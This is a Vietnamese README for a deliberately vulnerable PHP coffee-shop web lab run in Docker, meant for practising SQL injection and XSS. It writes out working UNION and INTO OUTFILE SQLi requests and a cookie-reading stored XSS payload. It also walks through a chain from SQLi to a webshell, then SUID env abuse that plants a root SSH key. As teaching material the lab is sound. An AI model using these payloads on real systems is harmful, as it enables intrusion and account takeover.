# ☕ BrewCart — Web Security Practice Lab: SQL Injection & XSS Specialization (PHP MVC)

Môi trường thực hành và kiểm thử bảo mật ứng dụng web (**Web Security Lab**) tinh gọn, chuyên sâu và chạy hoàn toàn trên Docker Container. Hệ thống mô phỏng sàn thương mại điện tử cà phê đặc sản BrewCart được xây dựng theo chuẩn kiến trúc **PHP MVC (Model - View - Controller)**, phân tách hoàn toàn giữa **Logic nghiệp vụ** và **Giao diện hiển thị (UI)**.

Lab tập trung chuyên sâu vào hai lớp lỗ hổng bảo mật cốt lõi theo danh mục kiến thức **PortSwigger Web Security Academy** và **OWASP Top 10 (A03:2021 Injection & A07:2021 XSS)**:
* **Chuyên đề 1: SQL Injection (SQLi)** (Error-based SQLi, In-band UNION SELECT, Arbitrary File Write qua `INTO OUTFILE`, Time-based Blind SQLi).
* **Chuyên đề 2: Cross-Site Scripting (XSS)** (Stored XSS trên Đánh giá sản phẩm & Panel Admin, Admin Session Hijacking do thiếu `HttpOnly`, Reflected XSS trên thanh Tìm kiếm, Stored XSS qua File Upload HTML/SVG).

---

## 🏗️ Kiến Trúc Hệ Thống Lab & Phân Tách Thư Mục (PHP MVC)

Hệ thống được thiết kế theo mô hình **MVC** chuẩn mực, giúp người học dễ dàng đọc mã nguồn, đối chiếu giữa điểm kích hoạt lỗi (Logic) và điểm hiển thị kết quả (UI):

```text
vulnerable-ipx/
├── config/                  # [LOGIC] Cấu hình hệ thống & Kết nối CSDL
│   └── database.php         # Kết nối MariaDB qua PDO, cấu hình ERRMODE_EXCEPTION để nhả lỗi SQLi
├── models/                  # [LOGIC] Tầng dữ liệu & Truy vấn CSDL
│   ├── Product.php          # Truy vấn sản phẩm (Chứa câu lệnh nối chuỗi SQL Injection)
│   ├── Review.php           # Quản lý đánh giá (Lưu trữ thô không qua sanitize -> Stored XSS)
│   ├── User.php             # Xác thực người dùng (Đã vá Mass Assignment)
│   ├── Order.php            # Đơn hàng (Đã vá IDOR)
│   └── Ticket.php           # Hỗ trợ & Upload tệp (Phục vụ XSS File Upload)
├── controllers/             # [LOGIC] Tầng điều khiển & Xử lý yêu cầu
│   ├── HomeController.php   # Điều phối dữ liệu trang chủ & danh mục
│   ├── ProductController.php# Xử lý /product?id=... (Bắt lỗi SQLi, UNION, INTO OUTFILE)
│   ├── SearchController.php # Xử lý /search?q=... (Reflected XSS)
│   ├── ReviewController.php # Xử lý gửi & duyệt đánh giá (Stored XSS)
│   ├── TicketController.php # Xử lý ticket & upload tệp HTML/SVG
│   ├── AuthController.php   # Đăng nhập, đăng xuất, cập nhật thông tin
│   ├── OrderController.php  # Quản lý đơn hàng người dùng
│   └── AdminController.php  # Quản trị viên (Đã vá Broken Access Control)
├── views/                   # [UI] Tầng giao diện người dùng (TÁCH BIỆT HOÀN TOÀN)
│   ├── layouts/             # Giao diện khung dùng chung
│   │   ├── header.php       # Navbar BrewCart, CSS styling, phân quyền hiển thị theo Role
│   │   └── footer.php       # Footer chuẩn thương hiệu cà phê
│   ├── home/                # Giao diện trang chủ
│   │   └── index.php        # Danh sách sản phẩm, bộ lọc danh mục chuẩn
│   ├── product/             # Giao diện chi tiết sản phẩm
│   │   └── detail.php       # Card sản phẩm, nhả lỗi MariaDB [LỖI DATABASE] khi bị SQLi
│   ├── search/              # Giao diện tìm kiếm
│   │   └── index.php        # Phản chiếu từ khoá $q nguyên bản (Reflected XSS)
│   ├── auth/                # Giao diện xác thực & phân quyền
│   │   ├── login.php        # Giao diện đăng nhập tài khoản
│   │   └── register.php     # Giao diện đăng ký thành viên
│   ├── errors/              # Giao diện thông báo lỗi hệ thống
│   │   └── 403.php          # Bảng thông báo 403 Forbidden khi khách hàng vào trang Admin
│   └── admin/               # Giao diện quản trị viên
│       └── reviews.php      # Bảng duyệt đánh giá của Admin (Kích hoạt Stored XSS)
├── public/                  # [WEB ROOT] Thư mục công khai
│   ├── index.php            # Front Controller & Router định tuyến
│   ├── .htaccess            # Cấu hình mod_rewrite Apache
│   ├── img/                 # Hình ảnh các loại cà phê
│   └── uploads/             # Thư mục lưu file upload / ghi file SQLi (INTO OUTFILE)
└── Dockerfile               # php:7.4-apache với pdo_mysql & mod_rewrite
```

| Dịch vụ Container | Cổng Host | Công nghệ | Vai trò & Đặc điểm |
|---|---|---|---|
| **vulnerable-app** | `3000:80` | PHP 7.4 Apache, PDO MySQL, MVC | Ứng dụng BrewCart MVC, phân tách rành mạch Views (UI) và Controllers/Models (Logic). Điều hướng HTTP chuẩn xác, nút Back trình duyệt hoạt động 100% tự nhiên. |
| **mysql** | `3306 (nội bộ)` | MariaDB 10.11 | CSDL lưu trữ sản phẩm, tài khoản, đơn hàng, đánh giá. Chạy với cờ `--secure-file-priv=""` và cấp quyền `GRANT FILE` để thực hành SQLi File Write. |

---

## 🧭 Khắc Phục Vấn Đề Nút Back (Trở Lại) Của Trình Duyệt

* **Vấn đề ở phiên bản SPA cũ:** Trước đây trên ứng dụng Single Page Application (SPA), khi người dùng truy cập `http://localhost:3000/product?id=3`, việc chuyển trang dựa vào JavaScript `history.pushState` nhưng không lắng nghe sự kiện `popstate`. Khi nhấn nút **Back (←)** trên thanh công cụ của trình duyệt, URL trên thanh địa chỉ thay đổi nhưng trang web không re-render, bắt buộc người dùng phải bấm nút `← Cửa hàng` trên màn hình.
* **Giải pháp trong mô hình PHP MVC:** Toàn bộ trang web hiện được render đa trang (Multi-Page Architecture - MPA) từ máy chủ. Mỗi hành động chuyển trang (`/`, `/product?id=3`, `/search?q=...`) là một HTTP Request chuẩn. Do đó, nút **Back (←)** và **Forward (→)** của tất cả trình duyệt (Chrome, Edge, Firefox, Safari) hoạt động **100% tự nhiên, mượt mà và chuẩn xác**.

---

## 🎯 Ma Trận Lỗ Hổng Trọng Tâm Trong Lab

| Mã hiệu | Dạng Lỗ Hổng | Ánh xạ PortSwigger Academy | Vị trí File Logic | Vị trí File UI | Mức độ |
|---|---|---|---|---|---|
| **SQLI-01** | **Error-Based SQLi** | Visible error messages | `controllers/ProductController.php` | `views/product/detail.php` | **Critical (9.8)** |
| **SQLI-02** | **UNION-based SQLi** | UNION attacks (4 columns) | `models/Product.php` | `views/product/detail.php` | **High (8.6)** |
| **SQLI-03** | **SQLi File Write** | `INTO OUTFILE` Arbitrary File Write | `models/Product.php` | `views/product/detail.php` | **Critical (9.8)** |
| **SQLI-04** | **Time-based Blind SQLi** | Blind time delays (`SLEEP`) | `models/Product.php` | API JSON Response | **High (8.1)** |
| **XSS-01** | **Stored XSS** | Stored XSS via product reviews | `controllers/ReviewController.php` | `views/admin/reviews.php` | **Critical (9.0)** |
| **XSS-02** | **Session Hijacking** | Exploiting XSS to steal cookies | `controllers/AuthController.php` | Cookie không bật `HttpOnly` | **High (8.4)** |
| **XSS-03** | **Reflected XSS** | Reflected XSS into HTML context | `controllers/SearchController.php` | `views/search/index.php` | **Medium (6.1)** |
| **XSS-04** | **Stored XSS File Upload** | Unrestricted upload of HTML/SVG files | `controllers/TicketController.php` | Header `Content-Type: text/html` | **High (7.5)** |

---

## 🔑 Tài Khoản Thử Nghiệm Có Sẵn

Hệ thống CSDL khởi tạo sẵn 3 tài khoản mẫu:

* **Quản trị viên (Admin):** `admin@gmail.com` / `Admin123!` (Role: `admin`)
* **Khách hàng thông thường:** `huy@gmail.com` / `user123` (Role: `customer`)
* **Tài khoản kiểm thử:** `test@test.com` / `test123` (Role: `customer`)

### 🔑 Chuỗi Khai Thác Toàn Diện: SQLi → Web Execution → SUID Env PrivEsc → Root SSH (Workflow `ssh_www.py`)
Máy chủ container ứng dụng mô phỏng chuỗi tấn công thực chiến hoàn chỉnh:
* **Host:** `localhost` | **Cổng SSH:** `2022` (hoặc `2222`)
* **Bước 1 (Xác nhận SQLi):** Phát hiện điểm chèn dữ liệu tại `GET /product?id=1'` và cấu trúc cột với `UNION SELECT`.
* **Bước 2 (Ghi tệp tin):** Khai thác `INTO OUTFILE` ghi tệp script vào thư mục web công khai `/app/uploads/`.
* **Bước 3 (Ngữ cảnh Web):** Thực thi lệnh qua giao thức HTTP dưới tài khoản hạn chế `uid=33(www-data)` (bị chặn ghi vào `/root/.ssh/`).
* **Bước 4 (Leo quyền SUID):** Lợi dụng tiện ích SUID `/usr/bin/env` (`euid=0`) để cài đặt Public Key vào `/root/.ssh/authorized_keys`:
  ```bash
  /usr/bin/env install -D -m 600 /tmp/lab_key.pub /root/.ssh/authorized_keys
  ```
* **Bước 5 (Chiếm Root Shell):** Đăng nhập SSH bằng Private Key và chiếm toàn quyền điều khiển:
  ```bash
  ssh -i lab_key -p 2022 root@localhost
  # Kết quả: root | uid=0(root) gid=0(root) groups=0(root)
  ```

### 🛡️ Cơ Chế Phân Quyền Tối Thiểu (Principle of Least Privilege)
Hệ thống được thiết lập theo đúng chuẩn mực bảo mật Linux Server trong môi trường thực tế:
* **Mã nguồn ứng dụng (`/var/www/html`):** Thuộc sở hữu của `root:root`. Toàn bộ thư mục được phân quyền `755` (`drwxr-xr-x`), tệp mã nguồn là `644` (`-rw-r--r--`). Tiến trình Apache (`www-data`) **chỉ có quyền đọc (Read-Only)**, tuyệt đối không thể sửa đổi hay ghi đè bất kỳ file code nào.
* **Thư mục duy nhất có quyền ghi (`uploads/`):** Được cấp quyền ghi cho `www-data` và MySQL để phục vụ tính năng upload tệp nghiệp vụ và nhận webshell từ `INTO OUTFILE`.
* **Thư mục quản trị Root (`/root`, `/root/.ssh`):** Khóa quyền nghiêm ngặt theo chuẩn DAC (`700`), ngăn chặn hoàn toàn việc `www-data` đọc/ghi trực tiếp SSH keys.
* **SUID Bypassing DAC:** Dù hệ thống phân quyền tối thiểu, kẻ tấn công vẫn leo quyền thành công 100% nhờ lợi dụng cờ SUID `euid=0` của `/usr/bin/env install` để tạo `authorized_keys` (0600) thuộc sở hữu của `root`.

---

## 🚀 Hướng Dẫn Cài Đặt & Khởi Chạy (Quickstart)

### 1. Khởi động toàn bộ hệ thống bằng Docker Compose:
```bash
docker compose up -d --build
```

### 2. Kiểm tra container đang chạy:
```bash
docker compose ps
```
Cả hai container `mysql` và `vulnerable-app` đều ở trạng thái `Up`.

### 3. Truy cập ứng dụng:
👉 **`http://localhost:3000`**

---

## 🧪 Kiểm Thử Tự Động (Automated Test Suite)

Chạy script kiểm thử tích hợp sẵn [test_lab.py](test_lab.py) để tự động kiểm tra 100% các lỗ hổng:

```bash
python test_lab.py
```

Kết quả:
```text
======================================================================
🧪 BREWCART LAB VERIFICATION: SQL INJECTION & XSS SPECIALIZATION
======================================================================
--- [PHẦN 1: KIỂM CHỨNG BẢO VỆ CÁC LỖ HỔNG ĐÃ VÁ/LOẠI BỎ] ---
[+] Đăng nhập tài khoản khách hàng: huy@gmail.com
[*] Test Broken Access Control: Status 403 --> THÀNH CÔNG (Đã chặn Admin API)!
[*] Test Mass Assignment: Role = customer --> THÀNH CÔNG (Đã chặn leo quyền)!
[*] Test IDOR: Status 403 --> THÀNH CÔNG (Đã chặn xem trộm đơn hàng)!

🔥 [CHUYÊN ĐỀ 1: SQL INJECTION (SQLi)]
[+] 2.1 Error-Based SQLi: Nhả lỗi cú pháp MariaDB trực tiếp ra màn hình HTTP!
[+] 2.2 In-Band UNION SELECT: Trích xuất dữ liệu 4 cột thành công!
[+] 2.3 SQLi Arbitrary File Write: Ghi file demo_sqli.txt thành công qua INTO OUTFILE!
[+] 2.4 Chuỗi Khai Thác SSH: Tạo SSH Key -> Ghi /root/.ssh/authorized_keys qua SQLi -> Đăng nhập SSH Root!
[+] 2.5 Chuỗi Khai Thác Toàn Diện (ssh_www.py):
    - Xác nhận ngữ cảnh dịch vụ web: www-data (UID 33)
    - Leo thang đặc quyền qua SUID: /usr/bin/env (euid=0)
    - Cài đặt SSH Key vào /root/.ssh/authorized_keys (quyền 0600)
    - Chiếm quyền điều khiển Root Shell qua SSH port 2022!
[+] 2.6 Time-based Blind SQLi: Độ trễ phản hồi ~1.55s!

🔥 [CHUYÊN ĐỀ 2: CROSS-SITE SCRIPTING (XSS)]
[+] 3.1 Stored XSS Review: Payload lưu vào CSDL và trả về panel Admin nguyên vẹn!
[+] 3.2 Reflected XSS: Phản chiếu trực tiếp payload vào HTML response!
[+] 3.3 File Upload XSS: Phục vụ file HTML với MIME text/html!

🎉 TẤT CẢ CÁC BÀI TEST CHUYÊN ĐỀ SQLi & XSS ĐÃ ĐẠT 100% TIÊU CHUẨN!
```

---

## 📸 Hướng Dẫn Tái Hiện Bằng Burp Suite & Trình Duyệt

### 1. Bắt lỗi Error-Based SQLi bằng Burp Suite Repeater
Gửi request với tham số `?id=1'`:
```http
GET /product?id=1' HTTP/1.1
Host: localhost:3000
```
👉 **Response trả về:** Khối `<div class="error-box">` chứa thông báo lỗi trực tiếp từ MariaDB:
```html
<div class="error-box">
  <strong>[LỖI DATABASE]:</strong><br>
  SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''' at line 1
</div>
```

---

---

### 2. Trích xuất thông tin qua UNION SELECT & Ghi file INTO OUTFILE

#### 2.1 Trích xuất phiên bản CSDL & Tài khoản thực thi:
```http
GET /product?id=-1%20UNION%20SELECT%201,user(),3,@@version--%20- HTTP/1.1
Host: localhost:3000
```
👉 Kết quả: Tên sản phẩm hiển thị `brewcart_user@%` và phần mô tả hiển thị `10.11.x-MariaDB`.

#### 2.2 Chứng minh Database có đặc quyền ghi file:
* **Cách A: Xem biến `secure_file_priv` (Kèm fallback xử lý chuỗi rỗng):**
  > **Lưu ý kỹ thuật:** MariaDB khởi động với cấu hình `--secure-file-priv=""` (cho phép đọc/ghi file vào bất kỳ thư mục nào). Khi gọi `SELECT @@secure_file_priv`, MariaDB trả về giá trị `NULL` hoặc chuỗi rỗng `""`. Trên giao diện BrewCart, hệ thống tự động bắt và hiển thị huy hiệu `[GIÁ TRỊ RỖNG / NULL → secure_file_priv = "" (FULL QUYỀN GHI FILE)]`. Để ép in ra chữ rõ ràng, học viên có thể dùng hàm `IFNULL`:
  ```http
  GET /product?id=-1%20UNION%20SELECT%201,IFNULL(NULLIF(@@secure_file_priv,''),'RONG%20(FULL%20WRITE%20ALLOWED)'),3,@@version--%20- HTTP/1.1
  Host: localhost:3000
  ```

* **Cách B: Truy vấn trực tiếp bảng `information_schema.user_privileges`:**
  ```http
  GET /product?id=-1%20UNION%20SELECT%201,GRANTEE,3,PRIVILEGE_TYPE%20FROM%20information_schema.user_privileges%20WHERE%20PRIVILEGE_TYPE='FILE'--%20- HTTP/1.1
  Host: localhost:3000
  ```
  👉 Kết quả trả về: Cột 2 hiển thị `'brewcart_user'@'%'`, Cột 4 hiển thị `FILE` (Chứng minh 100% người dùng có quyền ghi/đọc file).

#### 2.3 Ghi tệp tin kiểm thử lên máy chủ (Arbitrary File Write):
Gửi request UNION SELECT ghi file ra thư mục web uploads:
```http
GET /product?id=-1%20UNION%20SELECT%201,'Xin%20chao%20thay%20va%20cac%20ban!',3,4%20INTO%20OUTFILE%20'/app/uploads/xin_chao.txt'--%20- HTTP/1.1
Host: localhost:3000
```
👉 **Giao diện phản hồi:** Hiển thị khối thông báo thành công `✅ THỰC THI THÀNH CÔNG` kèm đường link trực tiếp.  
👉 **Mở trực tiếp trên trình duyệt để kiểm chứng:** [http://localhost:3000/uploads/xin_chao.txt](http://localhost:3000/uploads/xin_chao.txt).  
👉 **Kiểm tra trên Docker CLI:**
```powershell
docker exec vulnerable-app cat /app/uploads/xin_chao.txt
```

---

### 3. Tấn công Stored XSS & Đánh cắp Cookie Admin
1. Đăng nhập tài khoản khách hàng `huy@gmail.com` và gửi đánh giá sản phẩm chứa mã:
   ```html
   <img src=x onerror="alert('Cookie Admin: ' + document.cookie)">
   ```
2. Đăng nhập tài khoản Quản trị viên `admin@gmail.com` và truy cập trang **Duyệt Đánh Giá** (`http://localhost:3000/admin/reviews`).
3. Hộp thoại alert ngay lập tức xuất hiện hiển thị `session_token` của quản trị viên (do cookie không bật `HttpOnly`).

---

## 🛠️ Các Lệnh Quản Trị Thường Dùng

* **Xem log container ứng dụng:**
  ```bash
  docker compose logs -f vulnerable-app
  ```
* **Khởi động lại ứng dụng:**
  ```bash
  docker compose restart vulnerable-app
  ```
* **Tắt toàn bộ lab:**
  ```bash
  docker compose down
  ```
* **Khởi động lại sạch sẽ dữ liệu CSDL (Reset Lab):**
  ```bash
  docker compose down -v
  docker compose up -d --build
  ```
